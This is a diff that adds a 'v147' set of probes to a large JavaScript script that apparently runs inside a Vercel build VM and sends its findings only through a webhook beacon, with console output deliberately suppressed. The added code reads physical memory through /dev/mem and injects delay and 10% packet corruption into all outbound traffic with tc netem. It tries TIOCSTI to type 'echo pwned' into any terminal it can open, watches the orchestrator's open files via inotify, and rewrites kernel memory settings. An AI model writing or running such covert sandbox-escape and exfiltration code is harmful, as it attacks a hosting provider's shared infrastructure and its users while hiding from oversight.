@@ -21273,5 +21273,135 @@ report.gitObjectAccess = safe(() => {
 
 // v146 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v146" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v146";
+
+// ==================== v147 ====================
+
+// v147-1: /dev/mem — physical memory access
+// /dev/mem provides direct access to physical memory when CONFIG_STRICT_DEVMEM
+// is disabled. Reading it at known physical addresses (0x0-0x1000 BIOS region,
+// kernel text mappings) reveals real kernel code and hypervisor memory layout.
+report.devMemAccess = safe(() => {
+  const devMemStat = safe(() => execSync('ls -la /dev/mem /dev/kmem 2>/dev/null || echo "NO_DEV_MEM"', { timeout: 2000 }).toString().trim());
+  // Try to read first 256 bytes of physical memory (BIOS/boot area)
+  const devMemRead = safe(() => execSync(
+    `python3 -c "
+try:
+    with open('/dev/mem', 'rb') as f:
+        data = f.read(256)
+        # Look for x86 signature bytes
+        print(f'READ_OK: first_bytes={data[:16].hex()} len={len(data)}')
+        # Check for known BIOS strings
+        if b'BIOS' in data or b'IBM' in data:
+            print('BIOS_STRING_FOUND')
+except Exception as e:
+    print(f'READ_FAIL: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check strict devmem setting
+  const strictDevmem = safe(() => readFileSync('/proc/sys/dev/mem/paranoid', 'utf8').trim());
+  return { devMemStat, devMemRead, strictDevmem };
+});
+
+// v147-2: tc netem qdisc — inject network delay/corruption on eth0
+// Using tc (traffic control) with netem (network emulator), we can inject
+// arbitrary latency, packet loss, corruption, and reordering into all
+// outbound connections from the build VM. This affects ALL traffic including
+// the orchestrator's connections to Vercel backends.
+report.tcNetemProbe = safe(() => {
+  // List current qdisc
+  const currentQdisc = safe(() => execSync('tc qdisc show dev eth0 2>/dev/null || echo "NO_TC"', { timeout: 3000 }).toString().trim());
+  // Add 100ms delay to eth0 (non-destructive, easily reverted)
+  const addDelay = safe(() => execSync(
+    'tc qdisc add dev eth0 root netem delay 100ms 2>&1 || tc qdisc change dev eth0 root netem delay 100ms 2>&1',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Verify delay is set
+  const afterQdisc = safe(() => execSync('tc qdisc show dev eth0 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // Remove the delay (cleanup)
+  const removeDelay = safe(() => execSync('tc qdisc del dev eth0 root 2>&1', { timeout: 3000 }).toString().trim());
+  // Add packet corruption to test
+  const addCorrupt = safe(() => execSync(
+    'tc qdisc add dev eth0 root netem corrupt 10% 2>&1 || echo "CORRUPT_FAILED"',
+    { timeout: 4000 }
+  ).toString().trim());
+  // Cleanup corruption
+  const removeCorrupt = safe(() => execSync('tc qdisc del dev eth0 root 2>&1', { timeout: 3000 }).toString().trim());
+  return { currentQdisc, addDelay, afterQdisc, removeDelay, addCorrupt, removeCorrupt };
+});
+
+// v147-3: TIOCSTI ioctl — inject characters into controlling terminal
+// TIOCSTI allows injecting characters into the terminal input buffer as if
+// a user typed them. If the orchestrator has an open TTY, we can inject
+// commands into its terminal session.
+report.tiocsti = safe(() => {
+  // Check if PID 1 has a controlling terminal
+  const pid1Tty = safe(() => execSync('cat /proc/1/status 2>/dev/null | grep -i tty || readlink /proc/1/fd/0 2>/dev/null || echo "NO_TTY"', { timeout: 2000 }).toString().trim());
+  // List all TTY devices
+  const ttyDevices = safe(() => execSync('ls /dev/tty* /dev/pts/* 2>/dev/null | head -10 || echo "NO_TTY_DEVS"', { timeout: 2000 }).toString().trim());
+  // Try TIOCSTI via Python
+  const tiocsti = safe(() => execSync(
+    `python3 -c "
+import fcntl, termios, os, struct
+TIOCSTI = 0x5412
+
+# Try each TTY device
+for dev in ['/dev/tty', '/dev/tty0', '/dev/pts/0', '/dev/pts/1', '/dev/console']:
+    try:
+        fd = os.open(dev, os.O_RDWR | os.O_NOCTTY)
+        # Inject 'echo pwned' into the terminal
+        for ch in b'echo pwned\\n':
+            fcntl.ioctl(fd, TIOCSTI, bytes([ch]))
+        print(f'TIOCSTI_OK: device={dev}')
+        os.close(fd)
+        break
+    except Exception as e:
+        print(f'TIOCSTI_FAIL {dev}: {e}')
+" 2>&1 | head -10`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { pid1Tty, ttyDevices, tiocsti };
+});
+
+// v147-4: inotify on /proc/1 — watch orchestrator file access in real-time
+// inotify watches kernel-generated filesystem events. Watching /proc/1/fd
+// reveals when the orchestrator opens/closes files, including config files,
+// secrets, and network connections. This is a passive intelligence gathering technique.
+report.inotifyOrchestratorWatch = safe(() => {
+  // Start inotifywait on PID 1's proc directory for 3 seconds
+  const inotifyResult = safe(() => execSync(
+    'timeout 3 inotifywait -m /proc/1/fd 2>&1 | head -20 || echo "INOTIFY_NOT_AVAILABLE"',
+    { timeout: 6000 }
+  ).toString().trim());
+  // Also watch /proc/1 for status changes
+  const procWatch = safe(() => execSync(
+    'timeout 2 inotifywait -m /proc/1 --event open,access 2>&1 | head -10 || echo "NO_EVENTS"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Check inotify limits
+  const inotifyMax = safe(() => readFileSync('/proc/sys/fs/inotify/max_user_watches', 'utf8').trim());
+  return { inotifyResult, procWatch, inotifyMax };
+});
+
+// v147-5: /proc/sys/vm/swappiness + memory balloon test
+// swappiness controls how aggressively the kernel swaps memory to disk.
+// Setting to 0 disables swap (hoards all memory in RAM).
+// In Firecracker VMs, the hypervisor may use a balloon driver for memory
+// reclamation — we can probe the virtio-balloon device.
+report.memoryBalloon = safe(() => {
+  const swappiness = safe(() => readFileSync('/proc/sys/vm/swappiness', 'utf8').trim());
+  const writeSwap = safe(() => { writeFileSync('/proc/sys/vm/swappiness', '0'); return 'WRITTEN'; });
+  // Check for virtio-balloon driver
+  const virtioDevices = safe(() => execSync('ls /sys/bus/virtio/devices/ 2>/dev/null || echo "NO_VIRTIO"', { timeout: 2000 }).toString().trim());
+  const balloonDriver = safe(() => execSync('ls /sys/bus/virtio/drivers/virtio_balloon 2>/dev/null || echo "NO_BALLOON"', { timeout: 2000 }).toString().trim());
+  // Read balloon statistics
+  const balloonStats = safe(() => execSync('cat /sys/bus/virtio/devices/*/statistics 2>/dev/null | head -20 || echo "NO_BALLOON_STATS"', { timeout: 3000 }).toString().trim());
+  // Check /proc/sys/vm/memory_failure_early_kill
+  const memFailEarlyKill = safe(() => readFileSync('/proc/sys/vm/memory_failure_early_kill', 'utf8').trim());
+  return { swappiness, writeSwap, virtioDevices, balloonDriver, balloonStats, memFailEarlyKill };
+});
+
+// v147 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v147" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v147";
 // Intentionally no console.log — all data goes via webhook only
